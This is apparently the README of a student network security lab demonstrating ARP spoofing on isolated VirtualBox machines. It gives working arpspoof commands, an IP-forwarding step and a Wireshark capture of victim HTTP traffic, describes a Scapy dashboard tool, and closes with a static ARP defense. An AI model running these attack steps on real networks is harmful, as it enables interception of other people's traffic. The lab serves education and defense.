# ARP Spoofing Attack and Defense

A practical network security lab demonstrating ARP Spoofing (Man-in-the-Middle attack) and defense mechanisms in an isolated VirtualBox environment.

---

## Overview

This project implements and demonstrates ARP cache poisoning using two separate methods:

- **Method A** — Terminal-based attack using `arpspoof` (industry-standard tool)
- **Method B** — Custom Python implementation using Scapy with a live Streamlit dashboard

A static ARP defense is then applied and tested against both methods to prove protocol-level protection.

---

## Network Topology

```
┌─────────────────┐         ┌─────────────────┐         ┌─────────────────┐
│   Victim VM     │         │  Attacker VM    │         │   Server VM     │
│   Ubuntu        │◄───────►│   Kali Linux    │◄───────►│   Ubuntu        │
│ 192.168.56.10   │         │ 192.168.56.20   │         │ 192.168.56.30   │
│ 08:00:27:E9:34:A5│        │ 08:00:27:3B:B2:1F│        │ 08:00:27:C3:F1:BC│
└─────────────────┘         └─────────────────┘         └─────────────────┘
                    Host-Only Network: 192.168.56.0/24
```

All three machines communicate over a VirtualBox Host-Only network — completely isolated from any real network.

---

## Files

| File | Purpose |
|------|---------|
| `arp_spoof.py` | ARP poisoning engine — bidirectional MITM using Scapy |
| `app.py` | Streamlit dashboard — live attack control, MAC table, packet counter |
| `requirements.txt` | Python dependencies |

---

## Requirements

### Virtual Machines

| VM | OS | IP | RAM |
|----|----|----|-----|
| Attacker | Kali Linux | 192.168.56.20 | 1536 MB |
| Victim | Ubuntu 22.04 | 192.168.56.10 | 1536 MB |
| Server | Ubuntu 22.04 | 192.168.56.30 | 1024 MB |

### Python (on Kali)

```bash
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

---

## Method A — Terminal Attack (arpspoof)

### Install tools
```bash
sudo apt update
sudo apt install dsniff wireshark -y
```

### Enable IP forwarding
```bash
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```

### Check ARP table on Victim (before attack)
```bash
arp -a
```
Note the real Server MAC: `08:00:27:C3:F1:BC`

### Run the attack — two terminals on Kali

Terminal 1:
```bash
sudo arpspoof -i eth0 -t 192.168.56.10 192.168.56.30
```

Terminal 2:
```bash
sudo arpspoof -i eth0 -t 192.168.56.30 192.168.56.10
```

### Verify poisoning on Victim
```bash
arp -a | grep 192.168.56.30
```
Expected result: MAC changes to `08:00:27:3B:B2:1F` (Attacker MAC)

### Capture traffic with Wireshark
Open Wireshark on Kali → select `eth0` → filter: `http`
Browse `http://192.168.56.30` from Victim — HTTP packets appear on Kali.

### Stop the attack
Press `Ctrl+C` in both terminals.

---

## Method B — Python Dashboard (Scapy + Streamlit)

### Refresh ARP cache on Victim first
```bash
sudo ip -s -s neigh flush all
ping -c 2 192.168.56.30
arp -a | grep 192.168.56.30
```
Confirm real Server MAC is back before proceeding.

### Launch the dashboard
```bash
cd ~/arp-lab
source venv/bin/activate
sudo $(which streamlit) run app.py --server.address 0.0.0.0 --server.port 8501
```

### Ping first (important — populates Kali's ARP cache)
```bash
ping -c 3 192.168.56.10
ping -c 3 192.168.56.30
```

### Open dashboard in Kali browser
```
http://localhost:8501
```

### Configure and start
- Network interface: `eth0`
- Victim IP: `192.168.56.10`
- Server IP: `192.168.56.30`
- Click **Start ARP spoofing**

The dashboard shows:
- Live MAC address table (Attacker / Victim / Server)
- Real-time packet counter
- Activity log with timestamps

### Verify on Victim
```bash
arp -a | grep 192.168.56.30
```
Expected result: same poisoned MAC as Method A — `08:00:27:3B:B2:1F`

### Stop and restore
Click **Stop attack** → **Restore ARP (cleanup)**

---

## Defense — Static ARP Entries

The same defense blocks both attack methods since it operates at the kernel ARP table level.

### Apply on Victim (lock the real Server MAC)
```bash
sudo arp -s 192.168.56.30 08:00:27:C3:F1:BC
```

### Apply on Server (lock the real Victim MAC)
```bash
sudo arp -s 192.168.56.10 08:00:27:E9:34:A5
```

### Confirm defense is active
```bash
arp -a | grep 192.168.56.30
```

### Re-run either attack method
The Victim's ARP table will remain unchanged — `08:00:27:C3:F1:BC` — even while the attack is actively sending poisoned packets.

---

## Why Two Methods?

| | Method A (arpspoof) | Method B (Python) |
|--|--|--|
| Approach | Black-box tool | Custom implementation |
| Visibility | Terminal output only | Live MAC table + packet counter |
| What it proves | Tool-based attack capability | Understanding of ARP packet structure (op=2, forged hwsrc) |

The Python version builds each ARP reply manually using Scapy's `ARP()` and `Ether()` layers, demonstrating packet-level understanding rather than just tool usage.

---

## Troubleshooting

| Problem | Fix |
|---------|-----|
| `streamlit: command not found` | Run `source venv/bin/activate` first |
| Dashboard fails to resolve MAC | Ping victim/server from Kali before starting |
| Victim MAC not changing | Confirm both VMs are running and on the same host-only adapter |
| Ping fails between VMs | Check all VMs use the same Host-Only Ethernet Adapter in VirtualBox settings |
| Defense not working | Confirm you used the correct MACs — server MAC on Victim, victim MAC on Server |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| VirtualBox | Virtualization platform |
| Kali Linux | Attacker system |
| Ubuntu 22.04 | Victim and server systems |
| Apache2 | Web server on Server VM |
| arpspoof (dsniff) | Terminal-based ARP spoofing tool |
| Scapy | Python packet crafting library |
| Streamlit | Python web dashboard framework |
| Wireshark | Packet capture and analysis |
| Netplan | Static IP configuration |

---

## Ethics

This project runs exclusively on a host-only VirtualBox network on a single laptop. No real networks, external hosts, or third-party systems are involved. For educational purposes only.
